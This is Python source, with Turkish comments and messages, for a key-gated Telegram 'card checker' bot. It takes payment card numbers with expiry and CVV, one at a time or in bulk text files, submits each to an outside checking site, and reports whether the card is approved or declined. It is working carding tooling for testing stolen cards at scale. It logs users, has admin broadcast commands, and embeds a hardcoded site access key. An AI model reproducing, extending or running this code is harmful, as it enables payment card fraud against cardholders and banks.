# --- DOSYA: main.py (v20 - Operasyon Çavuşu Sistemi) ---
# UZUN İŞLEMLER ARKA PLANDA ÇALIŞIR, BOT KİLİTLENMEZ.

import logging
import requests
import time
import os
import re
import json
import io
from urllib.parse import quote
from datetime import datetime

from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import Forbidden

# -----------------------------------------------------------------------------
# 1. BİRİM: KRİPTO ODASI (bot_token.py'den bilgileri alıyoruz)
# -----------------------------------------------------------------------------
try:
    from bot_token import TELEGRAM_TOKEN, ADMIN_ID
except ImportError:
    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı veya içinde TELEGRAM_TOKEN ve ADMIN_ID yok!")
    exit()

# -----------------------------------------------------------------------------
# 2. BİRİM: İSTİHBARAT & OPERASYON (Site Checker)
# -----------------------------------------------------------------------------
class SiteChecker:
    # ... (Bu class'ta değişiklik yok, aynı kalıyor)
    def __init__(self, key):
        self.login_url = "https://kaderchecksystem.xyz/"
        self.key = key
        self.target_api_url = "https://kaderchecksystem.xyz/xrayefe.php"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
        self.timeout = 25
        self.new_suffix = "@tanriymisimben @lordizmchecker_bot"
    def login(self) -> bool:
        try:
            response = self.session.post(self.login_url, data={'key': self.key}, timeout=self.timeout)
            return response.ok and "GİRİŞ YAP" not in response.text
        except requests.exceptions.RequestException as e:
            logging.error(f"Siteye giriş hatası: {e}"); return False
    def check_card(self, card):
        try:
            formatted_card = quote(card)
            full_url = f"{self.target_api_url}?card={formatted_card}"
            response = self.session.get(full_url, timeout=self.timeout)
            original_response = response.text.strip()
            if "Approved" in original_response or "Declined" in original_response:
                parts = original_response.split(' | '); relevant_parts = parts[:-1]
                clean_response = ' | '.join(relevant_parts)
                return f"{clean_response} | {self.new_suffix}"
            return original_response
        except requests.exceptions.RequestException as e: return f"HATA: {e}"

# -----------------------------------------------------------------------------
# 3. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
# -----------------------------------------------------------------------------
class UserManager:
    # ... (Bu class'ta değişiklik yok, aynı kalıyor)
    def __init__(self, initial_admin_id):
        self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
        self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
        self.unused_keys = self._load_from_file(self.keys_file)
        self.activated_users = self._load_from_json(self.activated_users_file)
        self.unused_admin_keys = self._load_from_file(self.admin_keys_file)
        self.activated_admins = self._load_from_json(self.activated_admins_file)
        if not self.activated_admins and initial_admin_id != 0:
             self.activated_admins[str(initial_admin_id)] = "founding_father"
             logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı.")
    def _load_from_file(self, filename):
        if not os.path.exists(filename): return set()
        with open(filename, "r") as f: return {line.strip() for line in f if line.strip()}
    def _load_from_json(self, filename):
        if not os.path.exists(filename): return {}
        with open(filename, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except json.JSONDecodeError: return {}
    def _save_all_data(self):
        with open(self.keys_file, "w") as f: f.write("\n".join(self.unused_keys))
        with open(self.activated_users_file, "w") as f: json.dump(self.activated_users, f, indent=4)
        with open(self.admin_keys_file, "w") as f: f.write("\n".join(self.unused_admin_keys))
        with open(self.activated_admins_file, "w") as f: json.dump(self.activated_admins, f, indent=4)
    def is_user_activated(self, user_id): return str(user_id) in self.activated_users or self.is_user_admin(user_id)
    def is_user_admin(self, user_id): return str(user_id) in self.activated_admins
    def activate_user(self, user_id, key):
        if self.is_user_activated(str(user_id)): return "Zaten bir Lord'sun."
        if key in self.unused_keys:
            self.activated_users[str(user_id)] = key; self.unused_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış anahtar."
    def activate_admin(self, user_id, key):
        if self.is_user_admin(str(user_id)): return "Zaten Komuta Kademesindesin."
        if key in self.unused_admin_keys:
            self.activated_admins[str(user_id)] = key; self.unused_admin_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış Vezir Fermanı."

# -----------------------------------------------------------------------------
# 4. BİRİM: EMİR SUBAYLARI (Handlers)
# -----------------------------------------------------------------------------
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def log_activity(user: User, card: str, result: str):
    masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
    log_entry = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] - KULLANICI: @{user.username} (ID: {user.id}) - KART: {masked_card} - SONUÇ: {result}\n"
    with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)

# --- YENİ BİRİM: OPERASYON ÇAVUŞU ---
async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
    """Arka planda çalışan ve toplu check işlemini yapan görev."""
    job_data = context.job.data
    user_id = job_data['user_id']
    user = job_data['user']
    cards = job_data['cards']
    
    await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")

    report_content = ""
    site_checker: SiteChecker = context.bot_data['site_checker']
    for card in cards:
        result = site_checker.check_card(card)
        log_activity(user, card, result)
        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"
        time.sleep(0.5)

    report_file = io.BytesIO(report_content.encode('utf-8'))
    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Komutanım, operasyon tamamlandı. Raporun ektedir.")

# --- HANDLER'LAR ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
    user_manager: UserManager = context.bot_data['user_manager']
    if user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Lordum, Keskin Nişancı emrinde!\n`/check` komutunu kullanabilirsin.")
        return
    await update.message.reply_text("Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
    keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
    await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
    keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
    await update.message.reply_text("Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard))
    parser_example = ("Toplu kontrol yaparken `.txt` dosyanızı veya mesajınızı aşağıdaki gibi hazırlayınız:\n\n<pre>5522898050712020|02|28|000\n5522898050712020|02|28|000</pre>")
    await update.message.reply_html(parser_example)

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
    user_manager: UserManager = context.bot_data['user_manager']
    try:
        key = context.args[0]
        result = user_manager.activate_admin(update.effective_user.id, key)
        if result == "Success": await update.message.reply_text("✅ Ferman kabul edildi! Artık Komuta Kademesindesin.")
        else: await update.message.reply_text(f"❌ {result}")
    except (IndexError, ValueError): await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`")

# Diğer admin komutları (logs, duyuru) aynı kalıyor, onlara dokunmuyoruz.
async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
    if os.path.exists("terminator_logs.txt"): await update.message.reply_document(document=open("terminator_logs.txt", 'rb'), caption="İstihbarat raporu.")
    else: await update.message.reply_text("Henüz toplanmış bir istihbarat yok.")
async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
    if not context.args: await update.message.reply_text("Kullanım: `/duyuru Mesajınız`"); return
    duyuru_mesaji = " ".join(context.args)
    all_user_ids = set(user_manager.activated_users.keys()) | set(user_manager.activated_admins.keys())
    if not all_user_ids: await update.message.reply_text("Duyuru gönderilecek kimse bulunamadı."); return
    await update.message.reply_text(f"Ferman hazırlanıyor... {len(all_user_ids)} kişiye gönderilecek.")
    success, fail = 0, 0
    for user_id in all_user_ids:
        try:
            await context.bot.send_message(chat_id=int(user_id), text=f"📣 **Komuta Kademesinden Ferman Var:**\n\n{duyuru_mesaji}")
            success += 1
        except Exception: fail += 1
        time.sleep(0.1)
    await update.message.reply_text(f"✅ Ferman operasyonu tamamlandı!\nBaşarıyla gönderildi: {success}\nBaşarısız: {fail}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
    query = update.callback_query
    await query.answer()
    action = query.data
    if action == "activate_start":
        context.user_data['awaiting_key'] = True
        await query.edit_message_text(text="🔑 Lütfen sana verilen anahtarı şimdi gönder.")
    elif action == "activate_no_key":
        await query.edit_message_text(text="Key almak için @tanriymisimben e başvurabilirsin.")
    elif action.startswith("mode_"):
        mode = action.split('_')[1]
        context.user_data['mode'] = mode
        if mode == 'single': await query.edit_message_text(text="✅ **Tekli Mod** seçildi.\nŞimdi bir adet kart yolla.")
        elif mode == 'multiple':
            context.user_data['awaiting_bulk_file'] = True
            await query.edit_message_text(text="✅ **Çoklu Mod** seçildi.\nŞimdi içinde kartların olduğu `.txt` dosyasını gönder.")

async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
    user_manager: UserManager = context.bot_data['user_manager']
    if context.user_data.get('awaiting_key', False):
        key = update.message.text.strip()
        result = user_manager.activate_user(update.effective_user.id, key)
        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz. `/check` komutunu kullanabilirsiniz.")
        else: await update.message.reply_text(f"❌ {result}")
        context.user_data['awaiting_key'] = False; return
    if not user_manager.is_user_activated(update.effective_user.id): await update.message.reply_text("Botu kullanmak için /start yazarak başla."); return
    if context.user_data.get('mode') == 'single':
        cards = re.findall(r'\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}', update.message.text)
        if not cards: return
        card = cards[0]
        await update.message.reply_text(f"Tekli modda kart taranıyor...")
        site_checker: SiteChecker = context.bot_data['site_checker']
        result = site_checker.check_card(card)
        log_activity(update.effective_user, card, result)
        await update.message.reply_html(f"<b>KART:</b> {card}\n<b>SONUÇ:</b> {result}")
        context.user_data.pop('mode', None)
    else:
        if context.user_data.get('awaiting_bulk_file'):
            await update.message.reply_text("Kardeşim laf değil, dosya atman lazım. İçinde kartlar olan bir `.txt` dosyası.")

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): # ANA DEĞİŞİKLİK BURADA
    user_manager: UserManager = context.bot_data['user_manager']
    if not context.user_data.get('awaiting_bulk_file'): return
    if not user_manager.is_user_activated(update.effective_user.id): return

    await update.message.reply_text("Dosya alındı, askeri konvoy indiriliyor...")
    
    try:
        file = await context.bot.get_file(update.message.document)
        file_content_bytes = await file.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e:
        await update.message.reply_text(f"Dosyayı okurken bir hata oldu: {e}"); return
        
    cards = re.findall(r'\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}', file_content)
    if not cards: await update.message.reply_text("Dosyanın içinde geçerli formatta kart bulamadım."); return

    is_admin = user_manager.is_user_admin(update.effective_user.id)
    limit = 1000 if is_admin else 120
    if len(cards) > limit:
        await update.message.reply_text(f"DUR! Dosyadaki kart sayısı limitini aşıyor. Senin limitin: {limit} kart."); return
    
    # GÖREVİ OPERASYON ÇAVUŞUNA DEVREDİYORUZ
    job_data = {
        'user_id': update.effective_user.id,
        'user': update.effective_user,
        'cards': cards
    }
    context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")

    await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı. Bu işlem uzun sürecek, bittiğinde raporu sana teslim edecek. Sen botu kullanmaya devam edebilirsin.")
    
    context.user_data.pop('awaiting_bulk_file', None)
    context.user_data.pop('mode', None)

# -----------------------------------------------------------------------------
# 5. BİRİM: ANA KOMUTA MERKEZİ (main)
# -----------------------------------------------------------------------------
def main():
    if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
        print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return

    checker_instance = SiteChecker(key="47ca070e376270fff5f5ad3b75487b80")
    if not checker_instance.login():
        print("KRİTİK HATA: Siteye giriş yapılamadı!"); return
    
    user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
    print("Lordlar Kulübü (v20 - Operasyon Çavuşu) aktif...")
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.bot_data['site_checker'] = checker_instance
    application.bot_data['user_manager'] = user_manager_instance

    # Komutları ekle
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    
    # Handler'ları ekle
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, main_message_handler))
    application.add_handler(MessageHandler(filters.Document.TXT, document_handler))

    application.run_polling()

if __name__ == '__main__':
    main()
